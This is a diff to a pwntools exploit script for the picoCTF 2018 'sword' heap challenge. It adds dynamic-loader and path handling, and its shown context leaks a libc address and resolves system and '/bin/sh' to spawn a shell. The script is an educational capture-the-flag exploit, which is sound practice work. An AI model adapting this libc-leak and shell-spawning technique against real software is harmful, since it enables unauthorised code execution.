@@ -1,14 +1,19 @@
 #! /usr/bin/env python
+import os
 #
 from pwn import context, p64, u64, log, process, remote, args
 from pwn import gdb, ELF
 context.clear(arch='amd64', os='linux')
 
 
+HERE_DIR = os.path.dirname(os.path.abspath(__file__))
+
+
 class Attack:
-    def __init__(self, host, port, elf_name, libc_name, gdb_script=None):
+    def __init__(self, host, port, elf_name, libc_name, ld_linux_name=None, gdb_script=None):
         self.host, self.port = host, port
         self.elf_name, self.libc_name = elf_name, libc_name
+        self.ld_linux_name = ld_linux_name
         self.gdb_script = gdb_script
 
         self.elf = ELF(self.elf_name)
@@ -17,13 +22,18 @@ class Attack:
         self.p = None
 
 
-    def get_process(self, ld_preload=False):
+    def get_process(self, ld_preload=False, ld_linux=False):
         p = None
         if args.REMOTE:
             p = remote(self.host, self.port)
         else:
-            env = {'LD_PRELOAD': './%s' % self.libc_name} if ld_preload else None
-            p = process('./%s' % self.elf_name, env=env)
+            env = {'LD_PRELOAD': self.libc_name} if ld_preload else None
+            argv = []
+            if ld_linux:
+                argv.append(self.ld_linux_name)
+
+            argv.append(self.elf_name)
+            p = process(argv, env=env)
             if args.GDB:
                 gdb.attach(p.pid, self.gdb_script)
         return p
@@ -70,7 +80,7 @@ class Attack:
         libc = self.libc
         libc.symbols['/bin/sh'] = 0x0018cd57
 
-        with self.get_process() as self.p:
+        with self.get_process(ld_preload=True, ld_linux=True) as self.p:
             # -- stage 1 ---------------------------------------------------------------
 
             idx = self.create_sword()
@@ -92,10 +102,10 @@ class Attack:
             libc.address = ADDR_puts - libc.symbols['puts']
             ADDR_bin_sh = libc.symbols['/bin/sh']
             ADDR_system = libc.symbols['system']
-            log.info("puts @ plt : %s", hex(ADDR_puts))
-            log.info('libc       : %s', hex(libc.address))
-            log.info('bin_sh     : %s', hex(ADDR_bin_sh))
-            log.info('system     : %s', hex(ADDR_system))
+            log.info("puts    @ %s", hex(ADDR_puts))
+            log.info('libc    @ %s', hex(libc.address))
+            log.info('/bin/sh @ %s', hex(ADDR_bin_sh))
+            log.info('system  @ %s', hex(ADDR_system))
 
             self.harden_sword(idx2, BUF_LEN, '')
             self.harden_sword(idx1, BUF_LEN, '')
@@ -128,6 +138,7 @@ class Attack:
 if __name__ == "__main__":
     host, port = '2018shell2.picoctf.com', 43469
     elf_name, libc_name = 'sword', 'libc.so.6'
+    ld_linux_name = 'ld-linux-x86-64.so.2'
     gdb_script = r"""
 b 95
 b 177
@@ -144,5 +155,9 @@ x/s $sword1->sword_name
 
 c
 """
-    attack = Attack(host, port , elf_name, libc_name, gdb_script)
+    elf_name = os.path.join(HERE_DIR, elf_name)
+    libc_name = os.path.join(HERE_DIR, libc_name)
+    ld_linux_name = os.path.join(HERE_DIR, ld_linux_name)
+
+    attack = Attack(host, port , elf_name, libc_name, ld_linux_name, gdb_script)
     attack.exploit()
